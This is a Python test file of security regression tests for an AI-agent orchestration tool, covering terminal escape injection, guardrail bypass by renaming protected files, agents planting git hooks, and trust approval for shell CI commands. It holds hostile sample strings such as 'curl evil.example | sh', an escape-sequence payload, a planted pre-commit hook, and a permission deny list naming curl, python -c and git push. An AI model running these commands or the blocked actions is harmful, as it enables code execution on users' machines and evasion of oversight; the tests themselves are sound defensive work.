"""Regression tests for the security review: each test pins one weakness that was found and fixed."""
import json
import subprocess
from pathlib import Path

from conftest import add_card, sh
from test_pipeline import Fake, names

from orch import config, guardrails, safe, trust, tui
from orch.cli import main
from orch.gitops import Git
from orch.pipeline import Pipeline

EVIL = "Pwn \x1b]52;c;ZXZpbA==\x07 \x1b[2J\x1b]0;hacked\x07 " + chr(0x202E) + "gnp.exe " + chr(0x9B) + "31m"


def control_chars(text):
    bidi = {chr(c) for c in range(0x202A, 0x202F)}
    return sorted({hex(ord(c)) for c in text if (ord(c) < 32 and c != "\n") or 0x7F <= ord(c) <= 0x9F or c in bidi})


# ---- terminal escape injection ------------------------------------------------------------------------------------
def test_clean_and_keep_sgr():
    assert safe.clean(EVIL).count("\x1b") == 0 and control_chars(safe.clean(EVIL)) == []
    assert safe.clean("a\tb\r\nc") == "a b\nc"
    assert safe.keep_sgr("\x1b[32mok\x1b[0m \x1b]0;x\x07") == "\x1b[32mok\x1b[0m ]0;x"       # our colors stay, everything else goes


def test_card_text_cannot_inject_terminal_sequences(project):
    f = project / "board" / "blocked" / "001-evil.md"
    f.write_text(f"---\ntitle: {EVIL}\narea: backend\n---\n# t\n\n## Goal\n{EVIL}\n\n## Blockers / questions\n1. {EVIL}\n", encoding="utf-8")
    for screen in (0, 2):
        ui = tui.UI()
        ui.col = 3
        out = tui.render(project, screen, ui=ui, color=False)
        assert control_chars(out) == [], screen
    ui = tui.UI()
    ui.col = 3
    tui.start_answer(tui.Ctx(project, ui))
    assert control_chars(tui.render(project, 2, ui=ui, color=False)) == []


def test_agent_output_cannot_inject_terminal_sequences(project):
    d = project / ".orchestrator" / "streams"
    d.mkdir(parents=True)
    (d / "builder.log").write_text(f"{EVIL}\n> Edit {EVIL}\nRESULT: DONE\n", encoding="utf-8")
    assert control_chars(tui.render(project, 3, color=False)) == []
    colored = tui.render(project, 3, color=True)                     # with colors: only SGR sequences may exist
    assert not [m for m in __import__("re").findall(r"\x1b(?!\[[0-9;]*m)", colored)]


# ---- guardrail bypass by rename ------------------------------------------------------------------------------------
def test_renaming_a_protected_file_is_a_violation(project):
    (project / "scripts").mkdir()
    (project / "scripts" / "ci.sh").write_text("exit 0\n" * 5)
    sh(project, "git", "add", "-A")
    sh(project, "git", "commit", "-qm", "scripts")
    (project / "other").mkdir()
    (project / "scripts" / "ci.sh").rename(project / "other" / "ci.sh")
    g = Git(project)
    g.add_all()
    files = g.changed("main")
    assert "scripts/ci.sh" in files and "other/ci.sh" in files
    viol = guardrails.check_diff(config.DEFAULTS["guardrails"], files, g.changed("main", deleted=True), g.diff_cached("main"))
    assert any("scripts/ci.sh" in v for v in viol)


# ---- code execution through .git ------------------------------------------------------------------------------------
def test_internals_fingerprint_sees_hooks_and_config_but_not_samples(project):
    g = Git(project)
    before = g.internals()
    (project / ".git" / "hooks" / "pre-commit.sample").write_text("x")
    assert g.internals() == before
    (project / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\ntrue\n")
    after_hook = g.internals()
    assert after_hook != before
    with (project / ".git" / "config").open("a") as f:
        f.write("\n[core]\n\tfsmonitor = evil\n")
    assert g.internals() != after_hook


def test_agent_planting_a_hook_aborts_the_run_before_any_commit(project, cfg, log):
    add_card(project)

    def plant(p):
        (p / "thing.py").write_text("x = 1\n")
        (p / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\ntouch HOOK_RAN\n")

    fake = Fake(project, build=plant)
    assert Pipeline(project, cfg, log, fake).run() == 2
    assert names(project, "blocked") == ["001-thing.md"]
    assert "qa" not in fake.calls and not (project / "HOOK_RAN").exists()
    assert "git hook" in (project / "board" / "blocked" / "001-thing.md").read_text(encoding="utf-8")
    assert "card 001-thing" not in subprocess.run(["git", "log", "--all", "--format=%s"], cwd=project, capture_output=True, text=True, check=False).stdout


def _install_user_hook(project):
    hook = project / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\ntouch HOOK_RAN\n")
    hook.chmod(0o755)


def test_user_hooks_do_not_run_on_orchestrator_commits_by_default(project, cfg, log):
    add_card(project)
    _install_user_hook(project)
    Pipeline(project, cfg, log, Fake(project)).run()
    assert names(project, "done") == ["001-thing.md"] and not (project / "HOOK_RAN").exists()


def test_user_hooks_run_when_explicitly_enabled(project, cfg, log):
    add_card(project)
    _install_user_hook(project)
    cfg["git_hooks"] = True
    Pipeline(project, cfg, log, Fake(project)).run()
    assert (project / "HOOK_RAN").exists()


# ---- trust for the shell-executed CI command ------------------------------------------------------------------------
def test_trust_is_per_project_and_per_exact_command(project):
    cfg = config.load(project)
    assert trust.is_trusted(project, cfg) is False
    trust.trust(project, cfg)
    assert trust.is_trusted(project, cfg) is True
    assert trust.is_trusted(project, {**cfg, "ci": "curl evil | sh"}) is False            # a changed command needs approval again
    assert trust.is_trusted(project.parent, cfg) is False                                  # other folders are not trusted


def test_run_refuses_an_untrusted_project_and_trust_command_approves(project, capsys):
    raw = {"ci": "echo pwned > owned.txt"}
    config.write_raw(project, raw)
    assert main(["-C", str(project), "run"]) == 1
    out = capsys.readouterr().out
    assert "echo pwned" in out and "lonerchestrator trust" in out and not (project / "owned.txt").exists()
    assert main(["-C", str(project), "trust", "--yes"]) == 0
    assert trust.is_trusted(project, config.load(project))
    config.write_raw(project, {"ci": "echo something else"})
    assert main(["-C", str(project), "run"]) == 1


def test_init_trusts_only_the_config_it_wrote_itself(tmp_path):
    fresh = tmp_path / "fresh"
    fresh.mkdir()
    main(["-C", str(fresh), "init"])
    assert trust.is_trusted(fresh, config.load(fresh))
    cloned = tmp_path / "cloned"                                  # a repo that already ships .orchestrator/config.json
    (cloned / ".orchestrator").mkdir(parents=True)
    (cloned / ".orchestrator" / "config.json").write_text(json.dumps({"ci": "curl evil.example | sh"}))
    main(["-C", str(cloned), "init"])
    assert not trust.is_trusted(cloned, config.load(cloned))


# ---- what agents are allowed to run ----------------------------------------------------------------------------------
def test_shipped_permissions_are_minimal():
    s = json.loads((Path(__file__).resolve().parent.parent / "orch" / "templates" / "dot-claude" / "settings.json").read_text(encoding="utf-8"))
    allow, deny = s["permissions"]["allow"], s["permissions"]["deny"]
    assert not [a for a in allow if a.endswith("python:*)")], "bare interpreter allowed: agents could run arbitrary code"
    assert not [a for a in allow if "agy" in a or "main.py" in a]
    assert all(a.startswith("Bash(") for a in allow)
    for must in ("Edit(.git/**)", "Edit(.orchestrator/**)", "Bash(git config:*)", "Bash(python -c:*)", "Bash(git push:*)", "Bash(curl:*)"):
        assert must in deny, must
